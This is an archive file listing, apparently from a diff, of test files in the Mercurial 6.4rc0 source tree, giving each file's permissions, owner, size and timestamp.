+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1464 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qgoto.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      772 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qimport-fail-cleanup.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7753 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qimport.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8431 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qnew.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5559 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qpush-exact.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9769 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qpush-fail.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2771 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qqueue.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8592 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qrefresh-interactive.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7908 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qrefresh-replace-log-message.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8796 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qrefresh.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1862 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qrename.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      256 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qsave.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4935 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-safety.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1054 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-subrepo-svn.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15369 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-subrepo.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1835 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-symlinks.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    31781 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22377 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mv-cp-st-diff.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1883 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-acl.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      803 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-archive.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3683 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-clone-no-ellipsis.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2035 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-clone-non-narrow-server.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4410 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-clone-nonlinear.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2308 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-clone-stream.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7096 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-clone.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2938 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-commit.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1938 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-copies.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1644 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-debugcommands.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      910 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-debugrebuilddirstate.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5903 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-exchange-merges.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5948 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-exchange.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5239 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-expanddirstate.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4500 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-merge-outside.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4157 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1792 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-patch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10109 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-patterns.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3580 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-pull.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2756 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-rebase.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10763 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-shallow-merges.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3156 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-shallow.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4853 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-share.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2136 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-sparse.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5180 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-strip.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5863 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-trackedcmd.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1836 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-update.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9376 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-widen-no-ellipsis.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8778 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow-widen.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16779 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-narrow.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      559 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-nested-repo.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12402 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-newbranch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1682 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-newcgi.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1463 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-newercgi.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1259 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-no-symlinks.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2482 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-nointerrupt.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5530 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-notify-changegroup.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26430 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-notify.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15592 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obshistory.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    93773 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsmarker-template.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4312 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsmarkers-effectflag.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1209 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsolete-bounds-checking.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    95912 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsolete-bundle-strip.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5687 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsolete-changeset-exchange.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6138 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsolete-check-push.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7942 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsolete-checkheads.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24306 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsolete-distributed.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23743 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsolete-divergent.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4876 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsolete-tag-cache.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    69008 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-obsolete.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2056 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-oldcgi.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3471 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-origbackup-conflict.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7516 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pager-legacy.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11338 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pager.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3138 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-parents.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9312 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-parse-date.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7553 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-parseindex.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10978 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-parseindex2.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1694 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-patch-offset.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2627 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-patch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4725 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-patchbomb-bookmark.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2574 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-patchbomb-tls.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    97644 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-patchbomb.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2592 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pathconflicts-basic.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5032 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pathconflicts-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3977 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pathconflicts-update.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6697 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pathencode.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13367 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-paths.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3495 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pending.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1105 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-permissions.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    42259 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-persistent-nodemap.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    35925 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-phabricator.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4034 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-phase-archived.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    43157 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-phases-exchange.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30068 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-phases.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4913 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-profile.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17423 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-progress.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6790 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-propertycache.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2213 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-propertycache.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5716 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pull-branch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6939 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pull-bundle.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2567 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pull-http.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3488 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pull-network.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      505 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pull-permission.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1598 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pull-pull-corruption.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4647 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pull-r.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6763 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pull-update.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      220 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-purge-ignored-directory.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6620 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-purge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2742 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-cgi.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2138 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-multibranches-E1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2513 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-multibranches-E2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2286 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-multibranches-E3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1995 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-partial-C1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2050 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-partial-C2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1910 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-partial-C3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1953 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-partial-C4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1601 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-pruned-B1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2148 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-pruned-B2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2113 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-pruned-B3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2073 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-pruned-B4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2324 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-pruned-B5.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1932 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-pruned-B6.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1928 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-pruned-B7.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2691 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-pruned-B8.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1590 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-superceed-A1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2164 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-superceed-A2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2238 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-superceed-A3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1709 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-superceed-A4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1707 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-superceed-A5.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2653 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-superceed-A6.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2655 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-superceed-A7.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1954 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-superceed-A8.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1860 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2437 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2958 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3248 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3091 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D5.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2070 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D6.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2501 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D7.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16504 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-http.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    46216 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-race.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18907 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push-warn.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9108 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-push.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1659 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-pushvars.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10654 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-qrecord.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3897 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-racy-mutations.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2373 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rank.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11362 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-abort.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2630 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-backup.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7413 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-base-flag.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5506 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-bookmarks.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1156 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-brute-force.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9101 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-cache.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4409 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-check-restore.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15767 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-collapse.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12666 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-conflicts.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9743 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-dest.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5607 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-detach.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1181 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-empty-successor.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4515 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-emptycommit.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24186 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-inmemory.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11860 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-interruptions.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1923 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-issue-noparam-single-rev.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1979 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-legacy.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4224 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-mq-skip.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7337 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-mq.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12843 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-named-branches.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9602 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-newancestor.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19870 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-obsolete.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8453 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-obsolete2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15338 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-obsolete3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11805 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-obsolete4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10520 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-parameters.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2414 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-partial.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9707 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-pull.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9804 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-rename.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21542 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-scenario-global.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4185 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-templates.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3596 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebase-transaction.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3302 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rebuildstate.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2792 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-record.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8961 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-releasenotes-formatting.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5255 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-releasenotes-merging.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4544 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-releasenotes-parsing.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2723 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-relink.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3307 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remote-hidden.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      943 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-bad-configs.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13385 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-bgprefetch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      720 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-blame.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2569 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-bundle2-legacy.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2488 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-bundle2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2517 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-bundles.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4682 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-cacheprocess.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2950 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-clone-tree.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2989 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-clone.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2929 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-corrupt-cache.t
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)    13117 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-datapack.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3799 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-gc.t
